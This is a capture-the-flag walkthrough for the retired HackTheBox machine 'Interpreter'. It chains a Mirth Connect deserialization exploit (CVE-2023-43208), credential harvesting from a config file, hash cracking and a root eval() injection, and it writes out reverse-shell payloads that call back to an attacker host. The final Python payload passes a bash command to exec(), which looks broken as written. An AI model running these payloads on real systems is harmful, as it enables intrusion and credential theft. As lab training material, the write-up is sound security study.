# Interpreter — HackTheBox

**Platform:** HackTheBox
**OS:** Linux
**Status: Retired — full walkthrough published.**

**Full walkthrough:** [l3dsec.com/walkthroughs/interpreter-htb](https://l3dsec.vercel.app/walkthroughs/interpreter-htb.html)

---

## Attack Chain

```
Nmap → Mirth Connect 4.4.0 (80/443)
  → CVE-2023-43208 unauthenticated Java deserialization RCE
    → Shell as mirth
      → mirth.properties → MySQL credentials
        → MySQL → sedric PBKDF2 hash → hashcat → SSH → USER FLAG
          → notif.py running as root on 127.0.0.1:54321
            → eval() injection via XML POST → ROOT SHELL → ROOT FLAG
```

---

## 1. Enumeration

```bash
nmap -sV -sC <TARGET_IP> -Pn
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 (Debian)
80/tcp  open  http    Jetty (Mirth Connect)
443/tcp open  ssl     Jetty SSL (Mirth Connect)
```

Version fingerprint via Mirth's REST API:

```bash
curl -sk https://<TARGET_IP>/api/server/version -H "X-Requested-With: XMLHttpRequest"
# Returns: 4.4.0
```

---

## 2. Initial Foothold — CVE-2023-43208

Mirth Connect 4.4.0 is vulnerable to unauthenticated RCE via Java deserialization:

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS <TARGET_IP>
set RPORT 443
set LHOST <ATTACKER_IP>
set FETCH_WRITABLE_DIR /tmp
set payload cmd/unix/reverse_bash
exploit
```

Shell as `mirth`.

---

## 3. Credential Harvesting

```bash
find / -name "mirth.properties" 2>/dev/null
# /usr/local/mirthconnect/conf/mirth.properties
# database.username = mirthdb
# database.password = <redacted>
# database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

mysql -u mirthdb -p'<db_password>' mc_bdd_prod
```

MySQL enumeration reveals user `sedric` with a PBKDF2 hash, and an HL7 channel forwarding XML to `http://127.0.0.1:54321/addPatient`.

---

## 4. User Flag — Hash Cracking

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Hash cracked. SSH in as `sedric`, read `/home/sedric/user.txt`.

---

## 5. Privilege Escalation — eval() Injection

`notif.py` runs as root and listens on `127.0.0.1:54321/addPatient` — the same endpoint Mirth forwards XML to. It passes the `firstname` XML field directly to Python's `eval()`.

Payload from the `mirth` shell:

```python
import urllib.request, base64
from urllib.request import Request

cmd = "bash -i >& /dev/tcp/<ATTACKER_IP>/9004 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()
inj = f"{{exec(__import__('base64').b64decode('{b64}').decode())}}"
xml = f"<patient><firstname>{inj}</firstname><lastname>x</lastname></patient>"

req = Request(
    "http://127.0.0.1:54321/addPatient",
    data=xml.encode(),
    headers={"Content-Type": "application/xml"}
)
urllib.request.urlopen(req)
```

Root shell received on listener.

---

## Flags

| Flag | Value |
|------|-------|
| User | `redacted` |
| Root | `redacted` |

---

> For educational purposes only. Only test systems you own or have explicit written permission to test.
